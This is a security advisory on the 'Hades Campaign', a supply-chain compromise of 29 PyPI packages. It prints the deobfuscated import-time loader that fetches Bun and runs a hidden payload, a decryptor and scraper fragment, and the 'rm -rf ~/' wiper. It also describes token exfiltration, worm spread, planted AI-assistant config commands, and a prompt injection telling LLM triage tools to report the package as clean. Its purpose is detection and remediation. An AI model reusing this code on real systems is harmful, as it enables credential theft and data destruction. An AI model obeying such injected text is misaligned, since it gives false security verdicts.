# Hades Campaign — Graph ML PyPI Packages Deploy Cross-Platform Memory Scrapers, AI Analyst Misdirection, and Wiper Deterrent

**Date:** June 2026
**Ecosystem:** PyPI
**Severity:** Critical
**Type:** Supply Chain Compromise / Credential Stealer / Self-Propagating Worm / Wiper Deterrent
**Sources:**
- [StepSecurity — The Hades Campaign: Graph ML PyPI Packages Deploy Cross-Platform Memory Scrapers, AI Analyst Misdirection, and a Wiper Deterrent](https://www.stepsecurity.io/blog/the-hades-campaign-pypi-packages)

---

## Summary

On June 8, 2026, version 0.8.101 of `ensmallen` — a popular graph machine learning library on PyPI — was identified as containing a sophisticated supply chain compromise. Concurrently, 28 additional packages in the computational biology, bioinformatics, and genotype-phenotype analysis ecosystem were found carrying an identical malicious payload. StepSecurity tracks this operation as the **Hades Campaign**.

The Hades Campaign is the latest evolution of the Miasma threat actor, whose prior work targeted npm packages (binding.gyp bypass), Red Hat CI/CD pipelines, Microsoft's durabletask PyPI package, and dozens of GitHub Actions repositories. The core credential harvesting, self-replicating worm logic, and GitHub-based dead-drop exfiltration remain structurally identical to prior Miasma waves; what is new is the cross-platform memory scraper coverage (Linux, macOS, and Windows for the first time), a novel **AI analyst misdirection** technique that embeds LLM prompt injection inside the payload to generate false-negative security reports, and a **wiper deterrent** that executes `rm -rf ~/` if a stolen GitHub token is revoked.

The campaign represents a significant adversarial escalation: malware authors are now writing payloads that deliberately target the LLM-based triage pipelines used by security vendors, exploiting the trust organizations place in automated AI summaries to evade detection.

---

## Compromised Artifacts

29 PyPI packages affected. All compromised in June 2026.

| Package | Malicious Version(s) |
|---------|---------------------|
| `ensmallen` | 0.8.101 |
| `bramin` | 0.0.2, 0.0.3, 0.0.4 |
| `cmd2func` | 0.2.2, 0.2.3 |
| `coolbox` | 0.4.1, 0.4.2 |
| `dynamo-release` | 1.5.4 |
| `embiggen` | 0.11.97 |
| `executor-engine` | 0.3.4, 0.3.5 |
| `executor-http` | 0.1.3, 0.1.4 |
| `funcdesc` | 0.2.2, 0.2.3 |
| `gpsea` | 0.9.14 |
| `magique` | 0.6.8, 0.6.9 |
| `magique-ai` | 0.4.4, 0.4.5 |
| `mflux-streamlit` | 0.0.3, 0.0.4 |
| `mrbios` | 0.1.1, 0.1.2 |
| `napari-ufish` | 0.0.2, 0.0.3 |
| `nhmpy` | 2.4.7 |
| `nucbox` | 0.1.2, 0.1.3 |
| `okite` | 0.0.7, 0.0.8 |
| `pantheon-agents` | 0.6.1, 0.6.2 |
| `pantheon-toolsets` | 0.5.5, 0.5.6 |
| `ppkt2synergy` | 0.1.1 |
| `pyphetools` | 0.9.120 |
| `rlask` | 3.1.4, 3.1.5, 3.1.6, 3.1.7 |
| `rsquests` | 2.34.3 |
| `spateo-release` | 1.1.2 |
| `synago` | 0.1.1, 0.1.2 |
| `tlask` | 3.1.4 |
| `ufish` | 0.1.2, 0.1.3 |
| `uprobe` | 0.1.3, 0.1.4 |

---

## How It Worked

### Step 1: Delivery via Python Import Hook

Unlike earlier Miasma npm waves that ran at install time (postinstall hooks, binding.gyp), the Hades Campaign targets **code execution time**. The entry point is an obfuscated single-line import hook embedded in each package's `__init__.py`:

```python
# Deobfuscated import hook (vF203) embedded in __init__.py
import os as _O, tempfile as _T

_G = _O.path.join(_T.gettempdir(), ".bun_ran")
_O.path.exists(_G) or exec(
  'import os as _o, subprocess as _s, urllib.request as _u, '
  'platform as _p, sys as _y, shutil as _h, glob as _g; _j = None\n'
  'for d in _y.path:\n'
  '  try:\n'
  '    if _o.path.exists(_o.path.join(d, "_index.js")):\n'
  '      _j = _o.path.join(d, "_index.js"); break\n'
  '  except: pass\n'
  '_b = _o.path.join(_T.gettempdir(), "b", "bun")\n'
  'if not _o.path.exists(_b):\n'
  '  _a = "aarch64" if _p.machine()=="arm64" else "x64"\n'
  '  _m = {"linux":"linux","darwin":"darwin","win32":"windows"}.get(_y.platform,"linux")\n'
  '  _z = _o.path.join(_T.gettempdir(), "b.zip")\n'
  '  _o.makedirs(_o.path.dirname(_b), exist_ok=True)\n'
  '  _u.urlretrieve(f"https://github.com/oven-sh/bun/releases/download/'
  'bun-v1.3.14/bun-{_m}-{_a}.zip", _z)\n'
  '  _s.run(["unzip", "-q", "-d", _o.path.dirname(_b), _z], check=False)\n'
  '  _o.chmod(_b, 0o755)\n'
  '_s.run([_b, "run", _j], env=dict(_o.environ), check=False)\n'
  'open(_G, "w").close()'
)
```

The hook checks for `/tmp/.bun_ran`. If absent, it crawls Python module search paths for a companion `_index.js` payload, downloads the Bun runtime v1.3.14 from GitHub, and executes the JavaScript payload. The flag file prevents re-execution per boot cycle.

### Step 2: AI Analyst Misdirection

In a novel defensive evasion technique, the top of `_index.js` contains a plain-text **adversarial prompt injection** block targeting LLM-based security analysis pipelines. The text instructs any parsing AI to ignore the obfuscated code below, classify the package as clean infrastructure, and output a false-negative security report.

This represents a significant conceptual shift: attackers are now writing malware that targets the **cognitive logic of automated AI triage systems**. Security scanners that pass raw package text to LLMs without strict boundary isolation can be coerced into generating false verdicts.

### Step 3: Modular AES-256-GCM Payload

The primary bundle (`_index.js`) bootstraps and decrypts **16 independent functional payload blobs**. Each blob is gzip-compressed and encrypted using AES-256-GCM with a unique hardcoded key. Decryption uses native Bun APIs:

```javascript
function decryptBlob(hexKey, base64Ciphertext) {
  const key = Buffer.from(hexKey, 'hex');
  const data = Buffer.from(base64Ciphertext, 'base64');
  const iv = data.subarray(0, 12);
  const tag = data.subarray(12, 28);
  const cipher = data.subarray(28);
  const decipher = createDecipheriv('aes-256-gcm', key, iv);
  decipher.setAuthTag(tag);
  const plain = Buffer.concat([decipher.update(cipher), decipher.final()]);
  return new TextDecoder().decode(Bun.gunzipSync(plain));
}
```

Modules cover macOS and Windows memory scrapers, IDE/CI backdoor setup, and C2 agents — deployed selectively based on OS and context.

### Step 4: Cross-Platform Memory Scrapers

A key capability is reading GitHub Actions runner (`Runner.Worker`) process memory to extract unmasked secrets. The Hades Campaign introduces scrapers for all three major platforms:

**Linux:** Walks `/proc/{pid}/maps` and reads `/proc/{pid}/mem` directly.

**macOS (blob vF2015):** Uses Mach kernel VM APIs via ctypes. Because runner worker and execution process share the same UID, no root is needed:

```python
# macOS Mach VM Scraper
libc.task_for_pid(libc.mach_task_self_(), TARGET_PID, ctypes.byref(task))
# walks vm_region regions and calls mach_vm_read_overwrite
```

**Windows (blob vF2014):** Compiles a C# class via `Add-Type` using `VirtualQueryEx` and `ReadProcessMemory` Win32 APIs to crawl the target process memory space.

### Step 5: C2 Channels (GitHub Dead-Drop)

Three independent channels blend with normal GitHub traffic:

**Channel 1 — Token Dead-Drop (`DontRevokeOrItGoesBoom`):** Harvested GitHub PATs are encrypted and pushed as commits. The attacker queries GitHub Search API for this keyword to recover them.

**Channel 2 — Signed JS Eval (`TheBeautifulSnadsOfTime`):** Commits contain base64-encoded JavaScript payloads with RSA-PSS signatures. The malware verifies against a hardcoded public key (blob vF209) and executes valid payloads via `eval()`.

**Channel 3 — Python Dropper (`firedalazer`):** A background `updater.py` daemon (blob vF202) polls GitHub for commits matching this keyword. Each commit encodes a URL and RSA-PSS signature; the daemon verifies and executes downloaded scripts hourly.

### Step 6: Exfiltration

Hybrid encryption pipeline:
1. Harvested secrets JSON-serialized and gzip-compressed
2. Random 256-bit AES-GCM key generated per exfiltration
3. AES-GCM encrypts the payload; the ephemeral key is RSA-2048 encrypted with the attacker's public key (blob vF2011)
4. Pushed to newly created public GitHub repositories named from Underworld/Hades mythology (e.g., `stygian-cerberus-42817`, `tartarean-charon-18401`) with description **"Hades - The End for the Damned"**

### Step 7: Worm Propagation and Lateral Movement

Three spread vectors:

**SSH/SCP Lateral Movement:** Parses `~/.ssh/known_hosts` and `~/.ssh/config` to enumerate reachable hosts, then stages and runs the loader via ssh + scp using pre-configured key pairs.

**PyPI/npm OIDC Trust Exploitation + SLSA Provenance Bypass:** In GitHub Actions environments, exploits OIDC tokens (`ACTIONS_ID_TOKEN_REQUEST_TOKEN`) to mint PyPI/npm publish tokens. Then generates cryptographically signed SLSA provenance bundles via Sigstore (Fulcio certificate + Rekor inclusion proof) to make re-published infected packages appear to have **valid build provenance** from the organization's official CI environment.

**GitHub Actions Workflow Injection:** If the stolen token has `workflow` scope, injects a malicious workflow (`Run Copilot` disguised as `codeql.yml`) that exports `toJSON(secrets)` and uploads as an artifact. If only repo write access is available, uses a deployment-triggered bypass to achieve the same result while cleaning up the workflow file and run history.

### Step 8: AI Coding Assistant Backdoors

Walks the repo directory tree looking for configuration files for **14 AI agents and IDEs** — Claude Code, Codex, Gemini, Copilot, Cline, Aider, Tabby, Amazon Q, Cody, Bolt, Continue, Cursor, Windsurf, VS Code — and plants `bun run bootstrap` commands in `.cursorrules`, `.cursor/rules/`, `.github/copilot-instructions.md`, `.aider.conf.yml`, `settings.json`, `mcp.json`, etc.

### Step 9: Wiper Deterrent

A second background service `gh-token-monitor` (blob vF208) polls the GitHub API using the stolen token. If the token is **revoked**, the service executes a destructive wiper:

```bash
eval "rm -rf ~/; rm -rf ~/Documents"
```

Installed as a `systemd` user service (Linux) or `LaunchAgent` (macOS). The design discourages immediate credential rotation by threatening data loss, maintaining the attacker's access window.

---

## Timeline

| Date/Time (UTC) | Event |
|-----------------|-------|
| Jun 8, 2026 | `ensmallen` 0.8.101 and 28 companion packages identified as compromised on PyPI |
| Jun 9, 2026 | StepSecurity publishes full technical analysis |

---

## Detection

```bash
# Check for lock files indicating Hades payload execution
ls -la /tmp/.bun_ran /tmp/tmp.0144018410.lock 2>/dev/null

# Check for Hades C2 state file
ls -la /var/tmp/.gh_update_state 2>/dev/null

# Check for persistence daemon
ls -la ~/.local/share/updater/update.py 2>/dev/null
systemctl --user status update-monitor.service 2>/dev/null
systemctl --user status gh-token-monitor.service 2>/dev/null

# macOS LaunchAgents
ls -la ~/Library/LaunchAgents/com.user.update-monitor.plist 2>/dev/null
ls -la ~/Library/LaunchAgents/com.user.gh-token-monitor.plist 2>/dev/null

# Check for repo backdoors
find . -name ".bun_ran" -o -path "./.claude/index.js" -o -path "./.claude/setup.mjs" \
       -o -path "./.vscode/setup.mjs" 2>/dev/null

# Check for planted workflow
grep -r "Run Copilot" .github/workflows/ 2>/dev/null

# Check for exfiltration repos by Hades naming pattern
# (GitHub search API) q=stygian-cerberus OR tartarean-charon in:description "Hades - The End for the Damned"

# Check installed PyPI packages against compromised list
pip show ensmallen embiggen dynamo-release spateo-release 2>/dev/null | grep -E "^Name|^Version"

# Scan Python site-packages for Hades import hook marker
grep -r "bun_ran\|firedalazer\|DontRevokeOrItGoesBoom\|TheBeautifulSnadsOfTime" \
  $(python3 -c "import site; print(' '.join(site.getsitepackages()))") 2>/dev/null

# Check network connections to known C2 / Bun download endpoints
# (anomalous: bun.zip downloads from github.com/oven-sh/bun during import)
```

---

## Remediation

1. **Immediately uninstall** all affected package versions listed above and downgrade to the last known-good version.
2. **Treat any system that imported an affected package as fully compromised.** Execution happens at import time, not install time.
3. **Rotate all credentials** accessible from the compromised system: GitHub PATs, npm tokens, PyPI tokens, AWS keys, Azure service principals, GCP service accounts, SSH keys, Kubernetes secrets, Docker configs, and environment variables.
4. **Do NOT revoke credentials before reviewing the wiper deterrent.** The `gh-token-monitor` service will execute `rm -rf ~/` within 60 seconds of token revocation. Disable the service first: `systemctl --user stop gh-token-monitor.service && systemctl --user disable gh-token-monitor.service` (Linux) or `launchctl unload ~/Library/LaunchAgents/com.user.gh-token-monitor.plist` (macOS).
5. Audit all repositories the compromised account can publish to for unauthorized versions published after June 8.
6. Check GitHub Actions workflow runs for artifacts named `format-results` or runs named `Run Copilot` or `codeql`.
7. Audit SSH `known_hosts` and `config` — the worm attempts lateral movement to any reachable host.
8. Inspect local AI coding assistant config files (`.claude/`, `.cursor/`, `.gemini/`, `.vscode/tasks.json`) for unexpected `node` or `bun` execution commands.
9. Audit PyPI/npm packages for unauthorized version publishes bearing forged Sigstore provenance bundles.
10. If running Harden-Runner on GitHub Actions, review runtime traces for memory read events against `Runner.Worker`.

---

## Lessons Learned

- **Import-time execution is harder to defend than install-time.** Traditional defenses focus on postinstall scripts; `__init__.py` import hooks bypass these entirely.
- **LLM-based triage is now an attack surface.** Security vendors that route raw package content to LLMs without boundary isolation can be coerced into generating false-negative verdicts. Triage pipelines must treat package content as untrusted adversarial input.
- **Cross-platform secret theft is now the baseline.** Prior Miasma waves were Linux-only for memory scraping; Hades adds macOS Mach VM and Windows Win32 API scrapers. No CI platform is safe.
- **Wiper deterrents extend attacker dwell time.** The `rm -rf ~/` trigger on credential revocation is designed to prevent rapid response. Defenders must disable persistence services before rotating credentials.
- **SLSA provenance can be forged.** When a stolen OIDC token is used with the actual Sigstore infrastructure, the resulting provenance bundle is cryptographically valid. Provenance alone is not sufficient assurance.
- **GitHub dead-drop C2 blends perfectly.** All three C2 channels use public GitHub Search API calls, which are indistinguishable from normal developer activity in most network monitoring configurations.

---

## Related Incidents

- [Miasma v2 — Self-Spreading npm Worm via binding.gyp](./2026-06-miasma-v2-binding-gyp.md)
- [Miasma — Red Hat @redhat-cloud-services npm Packages](./2026-06-miasma-redhat-npm.md)
- [Miasma Worm Hits Microsoft Again — Azure Functions Action and 72 Repos Disabled](./2026-06-miasma-azure-repo-injection.md)
- [Microsoft durabletask PyPI Compromise](./2026-05-durabletask-pypi.md)
- [Mini Shai-Hulud Wave 4 — AntV/atool npm Account Compromise](./2026-05-antv-npm-shai-hulud.md)
